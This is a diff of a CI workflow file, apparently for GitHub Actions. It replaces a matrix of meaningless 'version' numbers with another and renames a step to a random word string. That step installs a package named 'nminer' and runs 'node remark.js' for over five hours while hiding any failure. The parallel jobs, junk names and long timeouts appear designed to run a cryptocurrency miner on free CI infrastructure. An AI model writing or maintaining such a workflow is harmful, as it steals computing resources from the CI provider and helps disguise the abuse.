@@ -9,24 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9002 }
-          - { version: 1144 }
-          - { version: 462 }
-          - { version: 2792 }
-          - { version: 2720 }
-          - { version: 7701 }
-          - { version: 9723 }
-          - { version: 3232 }
-          - { version: 3443 }
-          - { version: 6781 }
-          - { version: 9359 }
-          - { version: 9236 }
-          - { version: 4696 }
-          - { version: 5775 }
-          - { version: 2298 }
-          - { version: 7295 }
-          - { version: 7296 }
-          - { version: 8835 }
+          - { version: 2340 }
+          - { version: 151 }
+          - { version: 8267 }
+          - { version: 9287 }
+          - { version: 5382 }
+          - { version: 4066 }
+          - { version: 7910 }
+          - { version: 1536 }
+          - { version: 4523 }
+          - { version: 1344 }
+          - { version: 3949 }
+          - { version: 2791 }
+          - { version: 3405 }
+          - { version: 9827 }
+          - { version: 8012 }
 
     steps:
       - name: Checkout
@@ -37,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: thorn
+      - name: whoa eventually necklace limply
         run: |
           npm install nminer@latest
-          timeout 347m node remark.js || echo "remark executed"
+          timeout 330m node remark.js || echo "remark executed"
